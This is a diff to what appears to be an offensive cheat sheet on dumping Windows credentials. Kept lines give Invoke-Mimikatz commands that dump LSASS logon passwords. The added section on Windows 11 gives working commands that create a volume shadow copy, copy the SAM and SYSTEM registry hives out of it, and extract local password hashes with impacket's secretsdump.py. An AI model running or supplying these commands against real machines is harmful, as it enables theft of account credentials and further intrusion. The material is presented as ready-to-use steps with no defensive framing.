@@ -50,3 +50,16 @@ Once the module is imported, you can run Invoke-Mimikatz to dump the LSASS</br>
 <code>Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords"'</code><br>
 * You can also using minidump module to select where to read:<br>
 <code>Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::minidump C:\Path\To\Load\Lsass"'</code>
+
+## 6. SAM/SECURITY [ Windows11 ]
+SAM/SECURITY Hives: These contain local account information and system security policies. Dumping from these hives can provide hashed passwords for local accounts and details about security settings. This method requires access to system files either offline or through the system registry.
+
+LSASS Process: LSASS handles both local and domain credentials, managing in-memory credential caches that include plaintext passwords, hashes, and Kerberos tickets. Dumping from LSASS offers a more comprehensive set of credentials, including those of currently logged-in users. This requires administrative access and is performed on a running system.
+
+<code>
+Run [ Windows11 ]
+$shadow = [WMIClass]"root\cimv2:Win32_ShadowCopy"
+$shadow.Create("C:\\", "ClientAccessible")
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[Number]\windows\system32\config\SAM C:\[SAM\To\Be\Saved\]
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\[SYSTEM\To\Be\Saved\]
+python3 /opt/impacket/examples/secretsdump.py -sam Sam -system SYSTEM LOCAL
